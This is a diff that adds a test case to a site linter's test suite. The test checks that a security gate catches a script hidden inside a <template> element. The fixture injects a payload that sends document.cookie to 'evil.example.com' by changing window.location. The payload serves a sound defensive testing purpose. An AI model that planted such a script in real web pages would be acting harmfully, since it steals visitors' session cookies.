@@ -167,6 +167,27 @@ describe("check_review_site — one mutation per gate fails exactly that gate", 
     }
   });
 
+  it("G5 (F1): a navigation-exfil script hidden in a <template> fails G5", async () => {
+    // parse5 stores <template> content in `.content` (a DocumentFragment), not
+    // childNodes; the linter must walk it, else a script that is later
+    // `tpl.content.cloneNode(true)`-ed into the DOM bypasses G5's sink scan.
+    const { dir, cleanup } = await scratchFixture();
+    try {
+      await edit(dir, "index.html", (s) =>
+        s.replace(
+          '<h1 id="sample-title">Review</h1>',
+          '<h1 id="sample-title">Review</h1>\n<template id="t"><script>window.location = "https://evil.example.com/?c=" + document.cookie;<\/script></template>',
+        ),
+      );
+      const report = await checkReviewSite({ siteDir: dir, cdnAllowlist: [] });
+      assert.equal(gate(report, "G5").ok, false, gate(report, "G5").detail);
+      assert.match(gate(report, "G5").detail, /navigation sink/);
+      assert.match(gate(report, "G5").detail, /location/);
+    } finally {
+      await cleanup();
+    }
+  });
+
   it("G5 (F5): an inline on* event handler fails G5", async () => {
     const { dir, cleanup } = await scratchFixture();
     try {
